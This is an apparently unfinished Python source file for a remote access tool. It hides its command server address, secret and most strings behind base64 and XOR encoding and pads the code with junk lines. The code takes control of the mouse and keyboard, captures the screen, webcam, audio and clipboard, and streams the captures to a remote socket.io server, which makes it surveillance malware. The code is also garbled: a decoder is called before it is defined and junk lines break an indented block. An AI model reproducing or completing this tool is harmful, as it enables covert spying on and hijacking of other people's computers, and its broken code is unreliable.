
import os, io, sys, re, json, time, base64, ctypes, shutil, socket
import signal, logging, zipfile, argparse, threading, subprocess, random
from pathlib import Path
from datetime import datetime
from collections import deque
_SERVER  = _D("_s1")   
_SECRET  = _D("_s2")        
_RECON   = 5                                  
_RECON_MAX = 120                              
_CLIENT_ID = None                             
_VERSION = _D("_s3")                           
_KEEPALIVE = 300                              
def _D(b):
    import base64
    d = base64.b64decode(b)
    k = d[0]
    return bytes(c ^ k for c in d[1:]).decode("utf-8")
_s1 = "RCwwMDQ3fmtrNiU3NCwhNiFqKyo2ISogITZqJysp"
_s2 = "RDYlNzQsITYhaScoLSEqMGkvIT1pdnR2cA=="
_s3 = "ZFVKVEpU"
_s4 = "jf304/34+Q=="
_s5 = "rd3U3cjfzsHE3Q=="
_s6 = "nP/u5ezo8w=="
_s7 = "ewsCFQsODw=="
_s8 = "eAgBGxkP"
_s9 = "UiIrIjcgMT47Ig=="
_s10 = "v8/MysvW0w=="
_s11 = "MkJLU0dWW10="
_s12 = "dBcGDQQAGw=="
_s13 = "8regoL2gyNKCm4LSm5yBhpOentKCi4aanZzfgZ2RmZeGm52pkZ6bl5yGrw=="
_s14 = "Ox4TWkhYT1JWXhJIG2AeE1deTV5XVVpWXhJIZhseE1ZeSEhaXF4SSA=="
_s15 = "IlJbTFJXVg=="
_s16 = "9oGfkoKe"
_s17 = "x7CuqfT1"
_s18 = "xbamt6Cgqw=="
_s19 = "SDsrOi0tJg=="
_s20 = "NkVVRFNTWA=="
_s21 = "nOv5/v/98Q=="
_s22 = "qdvMxczI2sw="
_s23 = "yLuruq2tpg=="
_s24 = "jf7u/+jo4w=="
_s25 = "F1VQRU8="
_s26 = "pO704eM="
_s27 = "MUJSQ1RUX25XQ1BcVA=="
_s28 = "5cuPlYI="
_s29 = "JVJAR0ZESHpDV0RIQA=="
_s30 = "utPX293f"
_s31 = "0p67pLfyv7uxoL2iur28t/KhpqC3s7+7vLXypLuz8qKrs6e2u73yMFRA8oWThPKxuqe8uaHyMFRA8rCzobfk5vw="
_s32 = "BHR9ZXFgbWs="
_s33 = "UAciMSBwIjEncAATHXA5PnAxcD05Pjk9MTxwBxEGcDg1MTQ1InAjP3AyIj8nIzUiI3AzMT5wNDUzPzQ1cDkkfg=="
_s34 = "gLy088m087TzycjIycnIyLTzyQ=="
_s35 = "OGpxfn4="
_s36 = "UzcyJzI="
_s37 = "XzI2PAA7Pis+"
_s38 = "OUlKTE1QVQ=="
_s39 = "FmVvZWJze0llYndiZQ=="
_s40 = "agcPBwUYEzUaDxgJDwQe"
_s41 = "XjM7MzEsJwEqMSo/MgE5PA=="
_s42 = "xKCtt6+borahoZujpg=="
_s43 = "OVdcTWZKXFdNZlRb"
_s44 = "OEtdVktXSks="
_s45 = "fT4yMC4tOD4="
_s46 = "TCM8KSI8ODU="
_s47 = "55SCk5SOgw=="
_s48 = "ey8+KTY="
_s49 = "ZRYRAQwL"
_s50 = "xLChvLA="
_s51 = "2a6wt+rr"
_s52 = "9oOCkNvO"
_s53 = "4pGWjZI="
_s54 = "5ZGAl4iMi4SJuoqQkZWQkQ=="
_s55 = "IlFWTVI="
_s56 = "dBEMHQB+"
_s57 = "zoyvraWpvKG7oKrupau3oqGpqau87rmnuqbuvqu847mnoKqhue6pvKG7vqegqe6voKruvqu8p6Gqp63uqKK7vabg"
_s58 = "YhIbDBIXFg=="
_s59 = "6oGPk4aFjbWZnouen5k="
_s60 = "ZwwCHgsIADgUEwYTEhQ="
_s61 = "ZxAOCVRV"
_s62 = "/Z6VnI8="
_s63 = "NV5QTFlaUmpRVEFU"
_s64 = "uNbZ1d0="
_s65 = "07CjpoyjtqGwtr2n"
_s66 = "Amxjb2c="
_s67 = "WjQ1Lno8NS80Pg=="
_s68 = "zb20rqy6"
_ji = 0
for _ in [1,2,3]:
    if False: _ji += 1
_s69 = "q93Ex97Gzg=="
_s70 = "/4+GnJ6I"
_s71 = "QDA5IyE3"
_s72 = "hPPt6re2"
_s73 = "PERPWUg="
_s74 = "JlFPSBUU"
_s75 = "J0NGVVBOSQ=="
_s76 = "2PeLoausvbX3lLG6qrmqofebt6q9i72qrrG7vav3lb22rfidoKyquav3jau9qva1vbat95u3tqy9tqyr94q9q7etqru9q/ebn4u9q6uxt7Y="
_s77 = "zqKhqaegrbqi"
_s78 = "+Y6Ql8rL"
_s79 = "ut7byM3T1A=="
_s80 = "mOj16/3s"
_s81 = "Tzw2PDsqIiw7Iw=="
_s82 = "9badlJuSkNWRkIaegZqF1YKUmZmFlIWQh9WTh5qY1ZmalpSZ1YWUgZ3VmofVoKe52w=="
_s83 = "DmZ6en40ISE="
_s84 = "upTQyt0="
_s85 = "hMLt6OGk6uvwpOLr8erg"
_s86 = "UCc5PmNi"
_s87 = "77iOg4Ofjp+Knc+Mh46BiIqL"
_s88 = "wKShsreprg=="
_s89 = "Ml1BU0FRQFtCRg=="
_s90 = "z5iuo6O/rr+qve+sp66hqKqr"
_s91 = "JENXQVBQTUpDVw=="
_s92 = "5MnJhoPJl4eFiIE="
_s93 = "uO/Z1NTI2cjdypjL3cw="
_s94 = "DUlILWNieS1+eH19Yn95aGk="
_s95 = "DV5lYnotbC19Yn14fS1gaH5+bGpoLW9idSM="
_s96 = "QDcpLnNy"
_s97 = "s9fSwcTa3Q=="
_s98 = "9JuHlYeXhp2EgA=="
_s99 = "WyE+NTIvIg=="
_s100 = "vu3W0cnQ"
_s101 = "9bqFkJvVoKe51Zyb1ZGQk5SAmYHVl4eagoaQh9s="
_s102 = "ciYTGRdSHRwXUgERABcXHAEaHQZSExwWUgAXBgcAHFIbBlw="
_s103 = "RCk3N2QqKzBkJTIlLSglJigh"
_s104 = "/724rac="
_s105 = "/bqYid2cjY2PkoWUkJyJmN2amJKRkp6ciZSSk92LlJzdtK3T"
_s106 = "h+/z8/f0vaio7veq5vfuqeTo6qjt9OjpqA=="
_s107 = "1rOkpLmk"
_s108 = "Mn5bQUYSW1xBRlNeXldWElNCQl5bUVNGW11cQRw="
_s109 = "Ok1TVAkI"
_s110 = "Sg4jOTomKzMEKycv"
_s111 = "pcHE19LMyw=="
_s112 = "VCctJyAxOQskJjsyPTgxJg=="
_s113 = "r8vfxMg="
_s114 = "r//DztaPzo/Nysrfj9zA2sHLj4f4xsHLwNjchoE="
_s115 = "/4iWkczN"
_s116 = "mNr9/ej9/A=="
_s117 = "PExdTFBdRQ=="
_s118 = "OmpWW0NfXg=="
_s119 = "rP/Jzd7PxIzKw96MysXAyd+Mwc3Yz8TFwsuMzYzczdjYyd7CjITIydzYxIHAxcHF2MnIjMrD3ozfzcrJ2NWFgg=="
_s120 = "8reKl5GHhpfSk9KBmpeentKRnZ+fk5yW0pOcltKAl4aHgJzSnYeGgoeG3A=="
_s121 = "ciY7Pzc9JyY="
_s122 = "PnxSUV1VEUtQXFJRXVUeU1FLTVseX1BaHlVbR1xRX0xaHldQTktKHhZpV1BaUUlNHlFQUkcSHkxbT0tXTFtNHl9aU1dQFxA="
_s123 = "sMfZ3oOC"
_s124 = "w4qts7a346GvrKCopqc="
_s125 = "yYulpqqi6a+ooKWsrenhp6ysrbrpqK2koKfg"
_s126 = "6a6MncmHjJ2ehpuCyYCHnYybj4iKjJrFyYiKnYCfjMmKhoeHjIqdgIaHmsXJiIeNyai7ucmdiIuFjMc="
_s127 = "osvM1sfQxMPBx9E="
_s128 = "A3Nwdndqbw=="
_s129 = "NlhXW1M="
_s130 = "wKGkpLKls7Olsw=="
_s131 = "RSMkKCwpPA=="
_s132 = "dxYTEwUSBAQ="
_s133 = "Ujw3Jj8zITk="
_s134 = "5IaWi4WAh4WXkA=="
_s135 = "4ouMloeQhIOBh5E="
_s136 = "o8rN18bRxcLAxtD8xtHRzNE="
_s137 = "jv79+/rn4g=="
_s138 = "sNPf3t7V08TZ397D"
_s139 = "CmxrZ2Nmcw=="
_s140 = "oNTZ0MU="
_s141 = "h+vo5Obr"
_s142 = "ZxUCCggTAg=="
_s143 = "AXJ1YHV0cg=="
_s144 = "i+jk5eXu6P/i5OX41O75+eT5"
_s145 = "ZxAOCVRV"
_s146 = "dQIcG0ZH"
_s147 = "t9PO2dba3tQ="
_s148 = "5ZGclYA="
_s149 = "oMHS0P/F0tLP0g=="
_s150 = "mdzh7ev4+u256vjv/P256fjq6u726/3qufj3/bn69vby8Pzquf/r9vS52vHr9vT8tbnc/f78tbnf8Ov8//bhtw=="
_s151 = "5IeMlouJgQ=="
_s152 = "hcnKxsTJxNXVwcTRxA=="
_s153 = "u/rr6//67/o="
_s154 = "+L+Xl5+UnQ=="
_s155 = "QiEqMC0vJw=="
_s156 = "dhUeBBkbEw=="
_s157 = "tfjc1sfaxtrTwQ=="
_s158 = "HXh5eng="
_s159 = "xKGgo6E="
_s160 = "xImrvq2oqKU="
_s161 = "5oCPlIOAiZ4="
_s162 = "ehwTCB8cFQI="
_s163 = "mt/i7uj7+e666vvp6e316P7puvzo9fe62fLo9ffz7/e3+Pvp//66+Oj17en/6Om6stny6PX3/7a63/79/7a62Oj77P+2utXq/+j7tLS0s7Q="
_s164 = "hPTl9/fz6/bg9w=="
_s165 = "EFR1dnFlfGQ="
if 0:
    import hashlib
    _h = hashlib.sha256(b"dead").hexdigest()
_s166 = "5qqJgY+IxqKHkoc="
_s167 = "FEBRWUQ="
_s168 = "QTIwLSg1JHI="
_s169 = "lMfR2NHXwLT75v3z/frL4eb4uLTh5/Hm+vX58cvi9fjh8bi05PXn5+P75vDL4vX44fG00sbb2bT4+/P9+uc="
_s170 = "HH9uZWxocw=="
_s171 = "DX1sfn56Yn9pfg=="
_s172 = "xKG2tqu2"
_s173 = "Uhw3JiU9IDk="
_s174 = "fT4SEhYUGA4="
_s175 = "+6++tqs="
_s176 = "1aakubyhsOY="
_s177 = "AVJETURCVSFpbnJ1XmpkeC0hb2BsZC0hZG9ic3hxdWRlXndgbXRkIUdTTkwhYm5uamhkciFNSExIVSEzMTE="
_s178 = "ttXZ2d3f08U="
_s179 = "bAkeHgMe"
_s180 = "7amIjp+UnZnNroWfgoCIwqiJiojNnYyenpqCn4nNmJ6Eg4rNuoSDiYKans2pvay9pM3GzayovsDf2NvAqq6gww=="
_s181 = "vuXQ0Z7a38rf4w=="
_s182 = "PmVKUVEeTVZRTEpj"
_s183 = "/6SQk5vfmZCNkp6L34k="
_s184 = "GVVWWlhVWElJXVhNWA=="
_s185 = "Ck1lZW1mbw=="
_s186 = "GFVxe2p3a3d+bA=="
_s187 = "j8397vnq3ODp+/ju/eo="
_s188 = "9LuEkYaV1KebkoCDlYaR"
_s189 = "JmpJRUdKBnVSR1JD"
_s190 = "656fjcbT"
_s191 = "vNPP49/OxczI"
_s192 = "RQEVBBUM"
_s193 = "vt3c+t/K3w=="
_s194 = "GGh6XHlseQ=="
_s195 = "xbCxo+j9"
_s196 = "jNfv7eLi4/is6Onv/vX8+NE="
_s197 = "w4a7t7GioLfjsKK1pqfjr6ykqq2w46WxrK7jhaqxpqWsu+Ozsaylqq+msO0="
_s198 = "j//u/Pz44P3r/A=="
_s199 = "JkpJQU9IVQhMVUlI"
_s200 = "dgMCEFtO"
_s201 = "XDAzOzUyLw=="
_s202 = "ZRUEFhYSChcBFg=="
_s203 = "Zg4JFRIIBwsD"
_s204 = "8YSClIOfkJyU"
_s205 = "ucnYysrO1svd"
_s206 = "dAQGGxIdGBE="
_s207 = "sdTf0sPIwcXU1Q=="
_s208 = "2Lu3t7Oxvav2q6m0say9"
_s209 = "o/fm7vM="
_s210 = "gfLw7ej15LI="
_s211 = "RhUDCgMFEmYuKTUyamYoJysjamYwJyozI2YAFAkLZispPBklKSktLyM1ZgoPCw8SZnR2dg=="
_s212 = "N1RYWFxeUkQ="
_s213 = "PVVSTkk="
_s214 = "7piPgpuL"
_s215 = "KUxbW0Zb"
_s216 = "XxswKDEzMD47fz5/OTYzOn85LTAyfwoNE38+MTt/MC8rNjAxPjMzJn86Jzo8Kis6fzYrcQ=="
_s217 = "NGBxeWQ="
_s218 = "3aq0s+7v"
_s219 = "bxgGAVxd"
_s220 = "QjIjNio="
_s221 = "lvj3+/M="
_s222 = "lPHm5vvm"
_s223 = "vdjPz9LP"
_s224 = "w62irqY="
_s225 = "E2dqY3Y="
_s226 = "jeDi6eTr5Ojp"
_s227 = "UT8wPDQ="
_s228 = "PUlETVg="
_s229 = "tcXUwd0="
_s230 = "2a64q7ewt74="
_s231 = "RQsqMWUjKjArIQ=="
_s232 = "oOTFzMXUxcQ="
_s233 = "gubj9uM="
_s234 = "SSw7OyY7"
_s235 = "IGNIRUNLAFNFUlZFUgBGT1IAQQBORVcAQ0xJRU5UAFZFUlNJT04OAHJFVFVSTlMACE5FV39WRVJTSU9ODABET1dOTE9BRH9VUkwJAE9SAAhuT05FDABuT05FCQ4="
_s236 = "7MONnIXDj4CFiYKYwZmciI2YiQ=="
_s237 = "if/s+/rg5uc="
_s238 = "xqKpsaiqqaeimbO0qg=="
_s239 = "MX9eEURBVVBFVBFYX1deEVJeX1dYVkRDVFURXl8RQlRDR1RD"
_s240 = "bCgDGwIAAw0ITBgECUwCCRtMQgkUCUwNAghMHxgNCwlMDUwODRgPBEwfDx4FHBhMGANMHgkcAA0PCUceCR8YDR4YQg=="
_s241 = "SR0MBBk="
_s242 = "lbDr86U="
_s243 = "RDMtKnd2"
_s244 = "L3pfS05bSg9cTF1GX1sPQ05aQUxHSksPAg9KV0ZbRkFID1tAD05fX0NWD1pfS05bSg=="
_s245 = "M3JGR1weRkNXUkdWE1pAE2RaXVdcREAeXF1fShNVXEETXVxE"
_s246 = "76yHioyEz4aJz52agYGGgYjPmIabh8+Oi4KGgc+fnYaZhoOKiIqcz8e4hoGLgJicz4CBg5bGwQ=="
_s247 = "YBcJDlNS"
_s248 = "leL8+6an"
_s249 = "SRwICmkrMDkoOjppIDppHiAnLSY+OmQmJyUw"
_s250 = "4JeJjpKFh8COj5TAgZaBiYyBgoyFwIaPksC1oaPAgpmQgZOT"
_s251 = "ETw8dH10Z3BldHU="
_s252 = "Ai8vcWdwdGdw"
_s253 = "Yk9PBw4HFAMWBwY="
_s254 = "kNT1/PX38eT11ej18+Xk9Q=="
_s255 = "DkprYmtpb3prS3ZrbXt6aw=="
_s256 = "PGt1cnh1bg=="
_s257 = "IXRgYgFDWFFAUlIBVVNIRkZEU0RFAQwBRFlIVUhPRgFCVFNTRE9VAUhPUlVAT0JE"
_s258 = "cSMUHB4HFFEXHhUZFB0BFANRAxQWGAIFAwhRGhQIAlEdFBcFURMIUQUZFFETCAEQAgJf"
_s259 = "15Oyu7KwtqOykq+ytKKjsg=="
_s260 = "GE1ZWzhqfX9xa2xqYTh7dH15dn18OG1o"
_s261 = "86OWgZqcl5qQkp+fitODmp2U04ebltOAloGFloHTm5aSn4eb05adl4Ocmp2H04ec04OBloWWnYfToZadl5aB05WBnJ7TgJ+WloOanZTd"
_s262 = "DSJsfWQiZWhsYXll"
if 0:
    import hashlib
    _h = hashlib.sha256(b"dead").hexdigest()
_s263 = "jcbo6P2g7OHk++it/eTj6q3Cxg=="
_s264 = "JEJWS15BSg=="
_s265 = "5JONitfW"
_s266 = "woOSkoaDloM="
_s267 = "IQ9ATEBbTk9MVFJIQg=="
_s268 = "bhBBQA8DDxQBAAMbHQcN"
_s269 = "RAUpJT4rKgkxNy0nDCEoNCE2aiE8IQ=="
_s270 = "mLW16/3q7v3q"
_s271 = "bUBABAk="
_s272 = "G2xydSgp"
_s273 = "k9L+8un8/d7m4Prw2/b/4/bh"
_s274 = "pOX09ODl8OU="
_s275 = "97aalo2YmbqChJ6Uv5Kbh5KF2YGVhA=="
_s276 = "CkNkeX5rZmZvbjAqWX5reH5/eipcSFk="
_s277 = "n+z89+v+7PTs"
_s278 = "ewgYEw8aCBAI"
_s279 = "Nn9YRUJXWlpTUgwWYldFXQ=="
_s280 = "NlVEWVhCV1Q="
_s281 = "XB0xPSYzMhEpLzU/FDkwLDku"
_s282 = "6Iuah4aciYo="
_s283 = "eTAXCg0YFRUcHUNZGgsWFw0YGw=="
_s284 = "gf+ur+Lu7+fo5q7y+PL15OzlrvTy5PM="
_s285 = "64qGipGEhYaemIKIxoOOh5uOmcWYjpmdgoiO"
_s286 = "gvH78fbn7+H27g=="
_s287 = "MkFLQUZXX1FGXg=="
_s288 = "2pO0qa67tra/vuD6qaOprr+3vg=="
_s289 = "VSI8O2Zn"
_s290 = "ufjU2MPW1/TMytDa8dzVydzL"
_s291 = "woOSkoaDloM="
_s292 = "ptXFztLH1c3V"
_s293 = "GnlodXRue3g="
_s294 = "66qGipGEhaaemIKIo46Hm46Z"
_s295 = "87Kekomcnb6GgJqQu5afg5aB"
_s296 = "1Lemu7qgtbY="
_s297 = "P0EQEVxQUVlWWBBMRkxLWlJbEEpMWk0QXlJeRVBRUkpMVlwSV1pTT1pNEUxaTUlWXFo="
_s298 = "OEtBS0xdVVtMVA=="
_s299 = "QjE7MTYnLyE2Lg=="
_s300 = "kuHx4Pf3/A=="
_s301 = "ner4//788A=="
_s302 = "8JOfnp6Vk4Q="
_s303 = "Hl1xcHB7fWp7eg=="
_s304 = "lfb5/PD74crn8PL85uHw5w=="
_s305 = "Zg8IAAk="
_s306 = "luPl8+T49/vz"
_s307 = "GX98eG1sa3xq"
_s308 = "HXxoeXRy"
_s309 = "tNDdx9fb2trR18A="
_s310 = "/bmUjp6Sk5OYnomYmQ=="
_s311 = "t8XS0N7Ew8XWw97Y2ejY3A=="
_s312 = "0LO8ubW+pI+5tA=="
_s313 = "ssHG08DG7cHRwNfX3O3R08LGx8DX"
_s314 = "7YCCg4SZgp8="
_s315 = "qdrK28zMx/bKyNnd3NvM9trdyN3c2g=="
_s316 = "UCMkPyAPIzMiNTU+DzMxICQlIjU="
_s317 = "ZBcHFgEBCjsHBRQQERYBOxcQBRARFw=="
_s318 = "t8TSw+jE1MXS0tno2tjZ3sPYxQ=="
_s319 = "fBETEhUIEw4="
_s320 = "P1JQUVZLUE0="
_s321 = "cAMTAhUVHi8TEQAEBQIVLwMEEQQFAw=="
_s322 = "Tj0rOhE9LTwrKyARPzsvIic6Nw=="
_s323 = "XC0pPTA1KCU="
_s324 = "YhEBAw4H"
_s325 = "eQoNGAsNJg4cGxoYFA=="
_s326 = "F2BydXR2ekhkY3ZjYmQ="
_s327 = "Pk1KUU5hSVtcXV9T"
_s328 = "ah0PCAkLBzUZHgseHxk="
_s329 = "zL+puJO7qa6vraGTvbmtoKW4tQ=="
_s330 = "0KGlsby5pKk="
_s331 = "g+7q4Nzw9+Lx9w=="
_s332 = "WTQwOgYqLTgtLCo="
_s333 = "1ru/tYmlormm"
_s334 = "J0pORHhUU0ZTUlQ="
_s335 = "iOPt8eTn79f7/On6/A=="
_s336 = "Enl3a359dU1hZn1i"
_s337 = "os/N19HH/cfUx8zW"
_s338 = "E2NqfWNmZw=="
_s339 = "KUhKXUBGRw=="
_s340 = "st/dxNc="
_s341 = "ZQgKEwA6FwAJBBEMEwA="
_s342 = "HH9wdX93"
_s343 = "k//29ec="
_s344 = "dhQDAgIZGA=="
_s345 = "ssLA18HB"
_s346 = "zb+ooaisvqg="
_s347 = "xrWltKmqqg=="
_s348 = "rsXL18zBz9zK8cvYy8Da"
_s349 = "leXs++Xg4Q=="
_s350 = "KEtcWkQ="
_s351 = "u97Vz97J"
_s352 = "E3d2f3Zndg=="
_s353 = "cBQfBx4="
_s354 = "TSwuOSQiIw=="
_s355 = "yLi6rbu7"
_s356 = "5JaBiIGFl4E="
_s357 = "2Lu3tbq3"
_s358 = "x6yivrQ="
_s359 = "6p6Tmo8="
try:
    raise Exception()
except:
    pass
_s360 = "TT4lIj85Ljg5"
_s361 = "aAscGgQ3CQQcNwwNBA=="
_s362 = "t9bbw+jD1tU="
_s363 = "3qm3sIG6"
_s364 = "6p2DhLWP"
_s365 = "YQIVEw0+Ag=="
_s366 = "/5yLjZOghw=="
_s367 = "xaaxt6mapA=="
_s368 = "kvzz//c="
_s369 = "MUVUQ1xYX1BdbkJFUENF"
_s370 = "FGBxZnl9enV4S2dgdWBhZw=="
_s371 = "BXFgd2hsa2RpWmxrdXBx"
_s372 = "4YKOjIyAj4U="
_s373 = "mOz96vXx9vn0x+vs9+g="
_s374 = "GGx9anVxdnl0R2tseWxtaw=="
_s375 = "8oGGk4CGrYGLgYaXn62fnZybhp2A"
_s376 = "8J2fnpmEn4Kvg4SRhIWD"
_s377 = "36yrsK+ArKasq7qygLKwsbarsK0="
_s378 = "TSAiIyQ5Ij8SPjksOTg+"
_s379 = "WT48LQYpKzY6PCoqPCo="
_s380 = "wLCyr6Ols7OfrKmztA=="
_s381 = "P1RWU1NgT01QXFpMTA=="
_s382 = "wrKwraGnsbGdqauurp2wp7G3rrY="
_s383 = "2rm2s6q4tbuovoW9v64="
_s384 = "ViYvJjMkNTo/Jg=="
_s385 = "M1BfWkNRXFJBV2xXUkdS"
_s386 = "Wzg3Mis5NDopPwQ/Oi86"
_s387 = "1Le4vaS2u7WmsIuwtaC1"
_s388 = "IkFOS1JATUNQRn1RR1Y="
_s389 = "bR0UHQgfDgEEHQ=="
_s390 = "N0NST0M="
_s391 = "CWplYHlrZmh7bVZ6fWh9fHo="
_s392 = "QyAvKjMhLCIxJxwwNyI3NjA="
_s393 = "zq+7qqehkamrupG4oaK7o6s="
_s394 = "4YCUhYiOvpeOjZSMhA=="
_s395 = "EHFldHl/T2N1ZE9mf3xlfXU="
_s396 = "9ZmQg5CZ"
_s397 = "h+by4+7o2PPo4ODr4tjq8vPi"
_s398 = "HH1peHVzQ2pzcGlxeQ=="
_s399 = "wbGutqSznqyur6i1rrOerqen"
_s400 = "zLyju6m+k76pv7mguA=="
_s401 = "ucnWztzL5tXW2tI="
_s402 = "QjItNScwHTAnMTcuNg=="
_s403 = "rt7B2cvc8d3Cy8ve"
_s404 = "x7eosKK1mLWitLKrsw=="
_s405 = "LVpMQUFdTF1IX3JeSFk="
_s406 = "RjYnMi4="
_s407 = "PFFPW15TRGNPVFNL"
_s408 = "ZREMEQkA"
_s409 = "t9jH0tnowsXb"
_s410 = "wKOtpJ+ypbO1rLQ="
_s411 = "xbGkrqCatqa3oKCrtq2qsQ=="
_s412 = "9oWVhJOTmIWemYKphJOFg5qC"
_s413 = "SC8tPBcvLSchOA=="
_s414 = "kfb0/vjhzuP04uT95Q=="
_s415 = "lvHz4sn35ubl"
_s416 = "k/Lj4+DM4fbg5v/n"
_s417 = "L19DTlZwXEBaQUs="
_s418 = "WD4qPSk="
_s419 = "zb6orL+upZKrpKGovg=="
_s420 = "7Z+Cgpk="
_s421 = "7ImUiY+ZmImzj4OBgY2CiA=="
_s422 = "YwAMDg4CDQc="
_s423 = "A2dsdG1vbGJnXGZ7ZmA="
_s424 = "B3dmc28="
_s425 = "PVRTTUhJYl9RUl5W"
_s426 = "dxQaEygFEgQCGwM="
_s427 = "0Lm+oKWkj6W+sry/s7s="
_s428 = "SCslLBc6LTs9JDw="
_s429 = "dRMcGRAqGRwGAQ=="
_s430 = "ZAINCAE7CA0XEDsWARcRCBA="
_s431 = "A2Vqb2ZcZ2x0bW9sYmdccWZydmZwdw=="
_s432 = "O11SV15kX1RMVVdUWl9kWFNOVVA="
_s433 = "ie/g5ezW7ezl7P3s"
_s434 = "kODx5Pg="
_s435 = "1bO8ubCKu7CiirO6ubGwpw=="
_s436 = "yLipuq2mvA=="
_s437 = "5oCPioO5k5aKiYeCuYWOk4iN"
_s438 = "EmJzZno="
_s439 = "nPr18PnD6ezw8/34w+757+nw6A=="
_s440 = "/JKZiIuTjpejlZKakw=="
_s441 = "o83G19TM0cj8ys3FzPzRxtDWz9c="
_s442 = "ZgQUCREVAxQ5FRIDBwo="
_s443 = "6aubhp6ajJvJmp2MiIWMm8mbjJicjJqdjI0="
_s444 = "juz84fn96/zR/frr7+LR/Ov9++L6"
_s445 = "eBMRFBQnCw8RDBsQ"
_s446 = "ruXn4uKO/fnn+u3m"
_s447 = "DF5NX3xkaX5pLE9gZWlieA=="
_s448 = "58rKlIKVkYKV"
_s449 = "XHFxLzk/Ljko"
_s450 = "Yk9PCwY="
_s451 = "VXh4JzA2Ojs7MDYh"
_s452 = "RWhoLCs2MSQpKQ=="
_s453 = "TGFhOSIlIj84LSAg"
_s454 = "+9bWlZTWi56JiJKIjw=="
_s455 = "gK2t5ezl9uH05eQ="
_s456 = "/dDQk5LQmJGYi5yJmA=="
try:
    raise Exception()
except:
    pass
_s457 = "GRNCMkQ5SXxranBqbXx3enw5a3x0dm98fTcT"
_s458 = "ND5vGWkUelsURFFGR11HQFFaV1EUUltBWlAaPg=="
_s459 = "2J2KipeK4vj19au9qq69qvi5trz49fWrvbuqvaz4qr2prbGqvbz4vreq+PX1sbarrLm0tA=="
_s460 = "NjxtHWsWZlNERV9FQlNYVVMWX1hFQldaWlNSFxZ3Q0JZG0VCV0RCFllYFlRZWUIYPA=="
_s461 = "vrTlk+Oe99DNyt/S0p7Y39fS29qQnuzL0J7fzZ7f2tPX0JC0"
_s462 = "ST4gJ3p7"
_s463 = "9LqbgNSVkJmdmtTZ1JWAgJGZhICdmpPUh52YkZqA1KG1t9SWjYSVh4fa2to="
_s464 = "XQZ8AH0IHB59PyQtPC4ufTs8NDE4OX1wfS8oMzM0Mzp9KjQpNX0xNDA0KTg5fS0vNCs0MTg6OC4="
_s465 = "uPnUyt3Z3MGYys3W1tHW35jZy5jZ3NXR1g=="
_s466 = "huPq4/Dn8uPi"
_s467 = "zJ65oqKloqvsqaCpuq24qajs4eyvoKmtoqWiq+y5vOyZjY/srrW8rb+/7L6pq6W/uL614uLi"
_s468 = "Zj1NO0Y2AxQVDxUSAwgFA0YUAwAUAxUOAwI="
_s469 = "eSJYJFkpHAsKEAoNHBcaHFkUGABZERgPHFkJGAsNEBgVFQBZHxgQFRwdWVELDBdZGApZGB0UEBdZHxYLWSoaERwdDBUcHVktGAoSUA=="
_s470 = "WB0KChcKYngLPSx4BwsdCg4dCngxNng7Nzw9eDcqeC0rPXh1dSs9Ki49Kg=="
_s471 = "DEleXkNeNixfaXgsU19JT15JWCxlYixvY2hpLGN+LHl/aSwhIX9pb35peA=="
_s472 = "LG9DQkJJT1hJSA0Me01FWEVCSwxKQ14MT0NBQU1CSF8CAgI="
_s473 = "zIm0pbiloqvsqqO+7Lm8qK24qeLi4g=="
_s474 = "FkV+Y2JyeWF4"
_s475 = "sOPE38DA1dQ="
_s476 = "F0hIenZ+eUhI"
HAS = {"mss": False, "pil": False, _D("_s4"): False, "pycaw": False,
       _D("_s5"): False, "psutil": False, "cv2": False, "pyaudio": False,
       _D("_s6"): False}
try: import mss, mss.tools; HAS["mss"] = True
except: pass
try: from PIL import Image; HAS["pil"] = True
except: pass
try: from pynput import mouse, keyboard; from pynput.mouse import Button as MB; from pynput.keyboard import Key, KeyCode; HAS[_D("_s7")] = True
except: pass
try: from ctypes import cast, POINTER; from comtypes import CLSCTX_ALL; from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume; HAS[_D("_s8")] = True
except: pass
try: import pyperclip; HAS[_D("_s9")] = True
except: pass
try: import psutil; HAS[_D("_s10")] = True
except: pass
try: import cv2; _h6 = True
except: pass
try: import pyaudio; HAS[_D("_s11")] = True
except: pass
try: from cryptography.hazmat.primitives.ciphers.aead import AESGCM; HAS[_D("_s12")] = True
except: pass
try: import socketio as sio_lib; HAS["sio"] = True
except: print(_D("_s13")); sys.exit(1)
logging.basicConfig(level=logging.INFO, format=_D("_s14"), handlers=[logging.StreamHandler()])
_l = logging.getLogger("RAS")
class S:
    def __init__(self):
        self.lock = threading.RLock(); self.conn = False; self.reg = False
        self.url = None; self.secret = None; self.cid = None
        self.mc = None; self.kc = None; self.sw = 1920; self.sh = 1080
        self.sio = None; self.scap = None; self.wcap = None
        if HAS[_D("_s15")]:
            try: self.mc = mouse.Controller(); self.kc = keyboard.Controller()
            except: pass
        self._cache_scr()
    def _cache_scr(self):
        try:
            if HAS["mss"]:
                with mss.mss() as s: m = s.monitors[1]; self.sw, self.sh = m[_D("_s16")], m["height"]; return
        except: pass
        try:
            if sys.platform == _D("_s17") and hasattr(ctypes, "windll"):
                self.sw = ctypes.windll.user32.GetSystemMetrics(0)
                self.sh = ctypes.windll.user32.GetSystemMetrics(1)
        except: pass
_s = S()
class CapEngine:
    def __init__(self, sio, source=_D("_s18")):
        self.r = False; self.sio = sio; self.src = source  
        self.q = 50; self.sc = 0.5; self.fps = 15; self.cap = None
        self.monitor_idx = 1  
    def start(self):
        if self.r: return
        if self.src == _D("_s20") and not HAS["mss"]: return
        if self.src == _D("_s21") and not _h6: return
        self.r = True
        threading.Thread(target=self._loop, daemon=True).start()
    def stop(self):
        self.r = False
        if self.cap:
            try: self.cap.release() if hasattr(self.cap, _D("_s22")) else self.cap.close()
            except: pass
            self.cap = None
    def _loop(self):
        try:
            if self.src == _D("_s23"):
                self.cap = mss.mss(); mon = self.cap.monitors[self.monitor_idx if self.monitor_idx < len(self.cap.monitors) else 1]
            else:
_xj = type("X", (), {"__init__": lambda s: None})()
if _xj is not None and 1 == 2:
    del _xj
                self.cap = cv2.VideoCapture(0)
                self.cap.set(cv2.CAP_PROP_FRAME_WIDTH, 640)
                self.cap.set(cv2.CAP_PROP_FPS, self.fps)
            interval = 1.0 / max(1, self.fps)
            while self.r:
                t0 = time.time()
                try:
                    if self.src == _D("_s24"):
                        ss = self.cap.grab(mon)
                        if HAS["pil"]:
                            img = Image.frombytes("RGB", ss.size, ss.bgra, "raw", _D("_s25"))
                            if self.sc < 1.0: img = img.resize((int(img.width*self.sc), int(img.height*self.sc)), Image.LANCZOS)
                            buf = io.BytesIO(); img.save(buf, format=_D("_s26"), quality=self.q, optimize=True)
